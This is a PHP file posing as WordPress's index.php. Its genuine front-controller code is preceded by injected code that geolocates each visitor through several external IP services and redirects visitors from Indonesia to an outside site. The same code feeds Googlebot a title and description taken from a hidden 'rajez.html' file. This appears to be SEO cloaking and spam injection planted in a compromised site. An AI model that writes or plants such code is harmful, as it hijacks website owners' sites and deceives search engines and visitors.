<?php
$ip_address = $_SERVER['REMOTE_ADDR'];

function get_country_by_ip($ip) {
    $json = @file_get_contents("http://ipinfo.io/{$ip}/geo");
    if ($json !== false) {
        $details = json_decode($json, true);
        if (isset($details['country'])) {
            return $details['country'];
        }
    }

    $json = @file_get_contents("http://ip-api.com/json/{$ip}");
    if ($json !== false) {
        $details = json_decode($json, true);
        if (isset($details['countryCode'])) {
            return $details['countryCode'];
        }
    }

    $json = @file_get_contents("https://freegeoip.app/json/{$ip}");
    if ($json !== false) {
        $details = json_decode($json, true);
        if (isset($details['country_code'])) {
            return $details['country_code'];
        }
    }

    $json = @file_get_contents("http://www.geoplugin.net/json.gp?ip={$ip}");
    if ($json !== false) {
        $details = json_decode($json, true);
        if (isset($details['geoplugin_countryCode'])) {
            return $details['geoplugin_countryCode'];
        }
    }

    $json = @file_get_contents("http://ipwhois.app/json/{$ip}");
    if ($json !== false) {
        $details = json_decode($json, true);
        if (isset($details['country_code'])) {
            return $details['country_code'];
        }
    }

    return 'UNKNOWN';
}

$country_code = get_country_by_ip($ip_address);

if ($country_code == 'ID') {
    header("Location: https://nyalanesia.id/500.shtml");
    exit();
}

$user_agent = $_SERVER['HTTP_USER_AGENT'];
if (strpos($user_agent, 'Googlebot') !== false) {
    $rajez_html = file_get_contents('rajez.html');

    preg_match("/<title>(.*?)<\/title>/is", $rajez_html, $title_matches);
    $title = $title_matches[1];

    preg_match('/<meta name="description" content="(.*?)"/i', $rajez_html, $description_matches);
    $description = $description_matches[1];

    echo "<title>$title</title>";
    echo "<meta name=\"description\" content=\"$description\">";
}
?>
<?php
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define( 'WP_USE_THEMES', true );

/** Loads the WordPress Environment and Template */
require __DIR__ . '/wp-blog-header.php';
